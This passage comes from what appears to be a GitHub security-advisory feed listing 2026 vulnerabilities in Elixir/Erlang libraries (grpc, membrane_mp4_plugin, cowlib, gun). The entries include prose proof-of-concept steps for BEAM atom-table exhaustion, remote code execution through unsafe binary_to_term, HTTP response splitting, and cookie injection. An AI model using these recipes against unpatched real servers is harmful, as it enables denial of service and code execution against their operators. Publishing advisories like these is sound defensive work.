<p><code>GRPC.Codec.Erlpack.decode/2</code> calls <code>:erlang.binary_to_term/1</code> directly on the raw gRPC message body without the <code>:safe</code> option. Any unauthenticated peer that can reach a gRPC endpoint with <code>Content-Type: application/grpc+erlpack</code> can crash the entire BEAM node via atom table exhaustion or, if a decoded fun term flows into a call site that invokes it, achieve remote code execution inside the server process.</p>
<h3 id="details">Details</h3>
<p><strong>Root cause</strong> — <code>lib/grpc/codec/erlpack.ex</code> implements <code>decode/2</code> as a bare <code>:erlang.binary_to_term(binary)</code> call with no <code>:safe</code> flag, no size limit, and no type validation. This has two independent exploitation paths:</p>
<p><strong>1. DoS via atom exhaustion</strong> — BEAM atoms are never garbage-collected and the global atom table is bounded (~1,048,576 entries). A crafted payload encoding large numbers of fresh atoms saturates the table and crashes the entire VM, taking down all applications on the node.</p>
<p><strong>2. RCE via fun materialization</strong> — Without <code>:safe</code>, <code>binary_to_term/1</code> reconstructs fun and external-fun terms from wire data. If the decoded value reaches any call site that applies it (e.g. <code>Enum.map</code>, <code>Task.async</code>, direct invocation), attacker-controlled code executes inside the server process.</p>
<p><strong>Configuration requirement:</strong> <code>GRPC.Codec.Erlpack</code> is not registered by default and must be explicitly added to the server's <code>codecs</code> option.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start a gRPC server with <code>codecs: [GRPC.Codec.Erlpack]</code>.</li>
<li>Open an HTTP/2 connection to the server.</li>
<li>Send a gRPC-framed POST to any RPC path with <code>Content-Type: application/grpc+erlpack</code> and a body of <code>:erlang.term_to_binary(fn -&gt; &lt;malicious_code&gt; end)</code>.</li>
<li>The server's <code>decode/2</code> materializes the fun; any downstream call site that invokes the decoded value executes the attacker's code.</li>
<li>For DoS only: send payloads encoding fresh atoms in a loop until the atom table is exhausted and the VM crashes.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Affects <code>grpc</code> ≥ 0.4.0. Any server that explicitly registers <code>GRPC.Codec.Erlpack</code> is vulnerable to unauthenticated node-level DoS and potentially RCE.</p>
<h3 id="references">References</h3>
<ul>
<li>Introduction commit: <a href="https://github.com/elixir-grpc/grpc/commit/25bcc569fe2cc4478531a6c546c923205fc751c9">https://github.com/elixir-grpc/grpc/commit/25bcc569fe2cc4478531a6c546c923205fc751c9</a></li>
<li>Patch commit: <a href="https://github.com/elixir-grpc/grpc/commit/272a97a5ea1b46af1819f14a831fcf35fc91f992">https://github.com/elixir-grpc/grpc/commit/272a97a5ea1b46af1819f14a831fcf35fc91f992</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/elixir-grpc/grpc/security/advisories/GHSA-grp7-v8xh-rj7h">https://github.com/elixir-grpc/grpc/security/advisories/GHSA-grp7-v8xh-rj7h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48853">https://nvd.nist.gov/vuln/detail/CVE-2026-48853</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/pull/540">https://github.com/elixir-grpc/grpc/pull/540</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/commit/272a97a5ea1b46af1819f14a831fcf35fc91f992">https://github.com/elixir-grpc/grpc/commit/272a97a5ea1b46af1819f14a831fcf35fc91f992</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-48853.html">https://cna.erlef.org/cves/CVE-2026-48853.html</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0">https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-48853">https://osv.dev/vulnerability/EEF-CVE-2026-48853</a></li>
<li><a href="https://github.com/advisories/GHSA-grp7-v8xh-rj7h">https://github.com/advisories/GHSA-grp7-v8xh-rj7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-grp7-v8xh-rj7h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-25T18:09:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[membrane_mp4_plugin] membrane_mp4_plugin has an unauthenticated denial-of-service via BEAM atom table exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-43hj-fxwj-49qw</id>
        <link href="https://github.com/advisories/GHSA-43hj-fxwj-49qw"/>
        <updated>2026-08-18T20:16:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>membrane_mp4_plugin</code> interns every 4-byte MP4 box name as a BEAM atom while parsing container headers, with no validation against an allow-list. Any code path that calls <code>Membrane.MP4.Container.parse/1</code> (or the bang variant) on attacker-controlled MP4 bytes can be made to exhaust the BEAM atom table, which is uncapped at the source but bounded by the runtime ceiling (around 1,048,576 atoms) and never garbage-collected. Once the ceiling is hit, the entire BEAM node aborts.</p>
<h3 id="details">Details</h3>
<p>The MP4 container parser walks the input stream box-by-box. For each box, <code>Membrane.MP4.Container.Header.parse/1</code> in <code>lib/membrane_mp4/container/header.ex</code> extracts the 4-byte name field and delegates to the private helper <code>parse_box_name/1</code>, which trims trailing spaces and passes the bytes through <code>String.to_atom/1</code>. Because <code>String.to_atom/1</code> creates a new atom unconditionally, every distinct attacker-chosen 4-byte sequence becomes a permanent allocation in the global atom table. Atoms are not subject to garbage collection, so unique names accumulate for the lifetime of the node.</p>
<p>The fix replaces the unsafe interning with <code>String.to_existing_atom/1</code> and treats unknown names as the <code>:unknown</code> atom downstream (with related plumbing in <code>parse_helper.ex</code>, <code>serialize_helper.ex</code>, and the ISOM/CMAF demuxer engines so the new error variant flows through cleanly).</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Generate an MP4-shaped payload of roughly 1.1 million minimal box headers, each 8 bytes long (4-byte size of 8, followed by a unique 4-byte ASCII name produced by enumerating combinations in the printable range).</li>
<li>Concatenate them into a single binary (~8 MB total).</li>
<li>Call <code>Membrane.MP4.Container.parse!/1</code> on the binary inside any process running under the target BEAM node.</li>
<li>The node aborts once the atom table ceiling is reached.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker who can get a single crafted MP4 file in front of any system that demuxes user-supplied media with <code>membrane_mp4_plugin</code> can crash the entire BEAM node hosting that pipeline, taking down every Erlang/Elixir application sharing the runtime. No authentication, network position, or user interaction is required beyond delivering the file to whatever processing path eventually calls the parser.</p>
<h3 id="references">References</h3>
<ul>
<li>Introduction commit: <a href="https://github.com/membraneframework/membrane_mp4_plugin/commit/ae4bf04c393aa1562f3df3d33e20bc5cb8130de2">https://github.com/membraneframework/membrane_mp4_plugin/commit/ae4bf04c393aa1562f3df3d33e20bc5cb8130de2</a></li>
<li>Patch commit: <a href="https://github.com/membraneframework/membrane_mp4_plugin/commit/56373d1ddc86968e55fbde795c14eeba24357b57">https://github.com/membraneframework/membrane_mp4_plugin/commit/56373d1ddc86968e55fbde795c14eeba24357b57</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/membraneframework/membrane_mp4_plugin/security/advisories/GHSA-43hj-fxwj-49qw">https://github.com/membraneframework/membrane_mp4_plugin/security/advisories/GHSA-43hj-fxwj-49qw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53423">https://nvd.nist.gov/vuln/detail/CVE-2026-53423</a></li>
<li><a href="https://github.com/membraneframework/membrane_mp4_plugin/commit/56373d1ddc86968e55fbde795c14eeba24357b57">https://github.com/membraneframework/membrane_mp4_plugin/commit/56373d1ddc86968e55fbde795c14eeba24357b57</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-53423.html">https://cna.erlef.org/cves/CVE-2026-53423.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-53423">https://osv.dev/vulnerability/EEF-CVE-2026-53423</a></li>
<li><a href="https://github.com/advisories/GHSA-43hj-fxwj-49qw">https://github.com/advisories/GHSA-43hj-fxwj-49qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43hj-fxwj-49qw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-18T20:16:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gun] cowboy and gun affected by an HTTP Request/Response Splitting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</id>
        <link href="https://github.com/advisories/GHSA-w4f7-4cxr-rv3c"/>
        <updated>2026-07-29T15:48:41.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') vulnerability in ninenines cowlib allows HTTP response splitting via non-VCHAR bytes in structured-fields string values.</p>
<p>cow_http_struct_hd:escape_string/2 in cowlib only escapes \ and ", passing all other bytes through verbatim. This creates an encoder/decoder asymmetry: the matching parser accepts only printable ASCII (0x20–0x7E, excluding " and ), but the encoder emits any byte including CR and LF. An application that builds a structured HTTP header via cow_http_struct_hd:item/1 (or a higher-level wrapper such as cow_http_hd:wt_protocol/1) from attacker-controlled input can have \r\n injected into the serialized header value. Once on the wire, the injected CRLF terminates the current header and any following bytes are interpreted as a new header, enabling HTTP response splitting.</p>
<p>This issue affects cowlib from 2.9.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43966">https://nvd.nist.gov/vuln/detail/CVE-2026-43966</a></li>
<li><a href="https://github.com/ninenines/cowboy/commit/f77cb9b5e730e300fffb551db1ba5d1c4ed878ef">https://github.com/ninenines/cowboy/commit/f77cb9b5e730e300fffb551db1ba5d1c4ed878ef</a></li>
<li><a href="https://github.com/ninenines/gun/commit/4f35609eb37109b106a863fc9ba83d7ee64e3e42">https://github.com/ninenines/gun/commit/4f35609eb37109b106a863fc9ba83d7ee64e3e42</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43966.html">https://cna.erlef.org/cves/CVE-2026-43966.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43966">https://osv.dev/vulnerability/EEF-CVE-2026-43966</a></li>
<li><a href="https://github.com/ninenines/cowlib/pull/163#issuecomment-4952645232">https://github.com/ninenines/cowlib/pull/163#issuecomment-4952645232</a></li>
<li><a href="https://github.com/ninenines/cowlib/pull/166#issuecomment-5067554701">https://github.com/ninenines/cowlib/pull/166#issuecomment-5067554701</a></li>
<li><a href="https://github.com/advisories/GHSA-w4f7-4cxr-rv3c">https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T18:31:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cowboy] cowboy and gun affected by an HTTP Request/Response Splitting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</id>
        <link href="https://github.com/advisories/GHSA-w4f7-4cxr-rv3c"/>
        <updated>2026-07-29T15:48:41.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') vulnerability in ninenines cowlib allows HTTP response splitting via non-VCHAR bytes in structured-fields string values.</p>
<p>cow_http_struct_hd:escape_string/2 in cowlib only escapes \ and ", passing all other bytes through verbatim. This creates an encoder/decoder asymmetry: the matching parser accepts only printable ASCII (0x20–0x7E, excluding " and ), but the encoder emits any byte including CR and LF. An application that builds a structured HTTP header via cow_http_struct_hd:item/1 (or a higher-level wrapper such as cow_http_hd:wt_protocol/1) from attacker-controlled input can have \r\n injected into the serialized header value. Once on the wire, the injected CRLF terminates the current header and any following bytes are interpreted as a new header, enabling HTTP response splitting.</p>
<p>This issue affects cowlib from 2.9.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43966">https://nvd.nist.gov/vuln/detail/CVE-2026-43966</a></li>
<li><a href="https://github.com/ninenines/cowboy/commit/f77cb9b5e730e300fffb551db1ba5d1c4ed878ef">https://github.com/ninenines/cowboy/commit/f77cb9b5e730e300fffb551db1ba5d1c4ed878ef</a></li>
<li><a href="https://github.com/ninenines/gun/commit/4f35609eb37109b106a863fc9ba83d7ee64e3e42">https://github.com/ninenines/gun/commit/4f35609eb37109b106a863fc9ba83d7ee64e3e42</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43966.html">https://cna.erlef.org/cves/CVE-2026-43966.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43966">https://osv.dev/vulnerability/EEF-CVE-2026-43966</a></li>
<li><a href="https://github.com/ninenines/cowlib/pull/163#issuecomment-4952645232">https://github.com/ninenines/cowlib/pull/163#issuecomment-4952645232</a></li>
<li><a href="https://github.com/ninenines/cowlib/pull/166#issuecomment-5067554701">https://github.com/ninenines/cowlib/pull/166#issuecomment-5067554701</a></li>
<li><a href="https://github.com/advisories/GHSA-w4f7-4cxr-rv3c">https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w4f7-4cxr-rv3c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T18:31:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gun] gun has an Unexpected Status Code or Return Value vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2j82-37xg-f9wp</id>
        <link href="https://github.com/advisories/GHSA-2j82-37xg-f9wp"/>
        <updated>2026-07-29T15:46:08.000Z</updated>
        <content type="html"><![CDATA[<p>Unexpected Status Code or Return Value vulnerability in ninenines gun (gun_http module) allows a malicious HTTP server to force the client into raw protocol mode via an unsolicited 101 Switching Protocols response.</p>
<p>In gun_http:handle_inform/8, when a 101 Switching Protocols response is received over HTTP/1.1, the function verifies only that the Upgrade header is syntactically valid and that the stream reference is a plain reference(). It does not check whether the client ever sent an Upgrade or Connection: upgrade header on the corresponding request. Because this check is absent, any 101 response (solicited or not) causes gun to dispatch a gun_upgrade message to the caller and transition the entire connection to raw protocol mode.</p>
<p>A malicious or compromised HTTP server can send an unsolicited 101 response to any HTTP/1.1 request, causing the gun client to abandon HTTP framing for that connection. Once in raw mode, gun_raw applies no flow control (flow=infinity) and re-arms socket active mode after every received packet, so the server can flood the client with arbitrary bytes. These are forwarded as unbounded gun_data messages to the owner process, exhausting its mailbox and BEAM memory, ultimately crashing the VM.</p>
<p>This issue affects gun: from 2.0.0 before 2.4.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43974">https://nvd.nist.gov/vuln/detail/CVE-2026-43974</a></li>
<li><a href="https://github.com/ninenines/gun/commit/5b48068c29ce5e112cb149b5857c7d4dc319a81b">https://github.com/ninenines/gun/commit/5b48068c29ce5e112cb149b5857c7d4dc319a81b</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43974.html">https://cna.erlef.org/cves/CVE-2026-43974.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43974">https://osv.dev/vulnerability/EEF-CVE-2026-43974</a></li>
<li><a href="https://github.com/advisories/GHSA-2j82-37xg-f9wp">https://github.com/advisories/GHSA-2j82-37xg-f9wp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j82-37xg-f9wp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-08T15:33:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gun] gun_http2 has an Origin Validation Error vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-36w4-95hv-5vwg</id>
        <link href="https://github.com/advisories/GHSA-36w4-95hv-5vwg"/>
        <updated>2026-07-29T15:45:19.000Z</updated>
        <content type="html"><![CDATA[<p>Origin Validation Error vulnerability in ninenines gun (gun_http2 module) allows cross-origin cookie injection via unvalidated HTTP/2 PUSH_PROMISE authority.</p>
<p>In gun_http2:push_promise_frame/7, the :authority pseudo-header from an incoming PUSH_PROMISE frame is stored verbatim into the promised stream record without checking that it matches the connection's origin. When gun_http2:headers_frame/9 later processes the response headers for the promised stream, it calls gun_cookies:set_cookie_header/7 with the unvalidated server-supplied authority before any status branching and before user code can act. This violates RFC 7540 §10.6 / RFC 9113 §8.4, which require receivers to treat as a protocol error any push for a resource the server is not authoritative for.</p>
<p>A malicious or compromised HTTP/2 server can plant cookies scoped to arbitrary third-party domains into the client's shared cookie store. This enables session fixation attacks against those domains and, if the planted cookie overrides a legitimate session token, may result in account takeover. No user interaction beyond making a normal HTTP/2 request to the attacker-controlled server is required.</p>
<p>This issue affects gun: from 2.0.0 before 2.4.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43972">https://nvd.nist.gov/vuln/detail/CVE-2026-43972</a></li>
<li><a href="https://github.com/ninenines/gun/commit/567863ff53802fed21c3b3f25812db7f7ae29676">https://github.com/ninenines/gun/commit/567863ff53802fed21c3b3f25812db7f7ae29676</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43972.html">https://cna.erlef.org/cves/CVE-2026-43972.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43972">https://osv.dev/vulnerability/EEF-CVE-2026-43972</a></li>
<li><a href="https://github.com/advisories/GHSA-36w4-95hv-5vwg">https://github.com/advisories/GHSA-36w4-95hv-5vwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-36w4-95hv-5vwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T15:32:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gun] gun has an Uncontrolled Resource Consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-r53j-fjj5-mv77</id>
        <link href="https://github.com/advisories/GHSA-r53j-fjj5-mv77"/>
        <updated>2026-07-29T15:45:18.000Z</updated>
        <content type="html"><![CDATA[<p>Uncontrolled Resource Consumption vulnerability in ninenines gun (gun_http module) allows a malicious server to exhaust client memory via unbounded HTTP/1.1 response buffering.</p>
<p>In gun_http:handle/5, three clauses accumulate incoming TCP data into the connection's buffer field using binary concatenation with no upper-bound check: the head clause appends data until the \r\n\r\n header terminator is found; the body_chunked clause appends data whenever cow_http_te:stream_chunked/2 returns a more result indicating an incomplete chunk boundary; and the body_trailer clause appends data until the trailing \r\n\r\n is found. In each case, when the expected terminator never arrives, the enlarged binary is stored back into state and the process waits for more data, with no configurable or hard-coded ceiling on buffer size.</p>
<p>A malicious or compromised server can exploit this by sending a partial response that never completes. For example, a response may begin with HTTP/1.1 200 OK\r\nX-Pad:  followed by an unbounded stream of arbitrary bytes, never sending the header terminator. The gun connection process will continuously append the incoming data to its buffer, causing unbounded heap growth. Because BEAM imposes no per-process heap limit by default, a single malicious connection can exhaust all available memory on the node, causing a node-wide out-of-memory crash.</p>
<p>This issue affects gun: from 1.0.0 before 2.4.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43973">https://nvd.nist.gov/vuln/detail/CVE-2026-43973</a></li>
<li><a href="https://github.com/ninenines/gun/commit/f3e7e0568b3c4cf9fa4bea79d5116e67ce76ad25">https://github.com/ninenines/gun/commit/f3e7e0568b3c4cf9fa4bea79d5116e67ce76ad25</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-43973.html">https://cna.erlef.org/cves/CVE-2026-43973.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-43973">https://osv.dev/vulnerability/EEF-CVE-2026-43973</a></li>
<li><a href="https://github.com/advisories/GHSA-r53j-fjj5-mv77">https://github.com/advisories/GHSA-r53j-fjj5-mv77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r53j-fjj5-mv77</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-08T15:33:00.000Z</published>
    </entry>
</feed>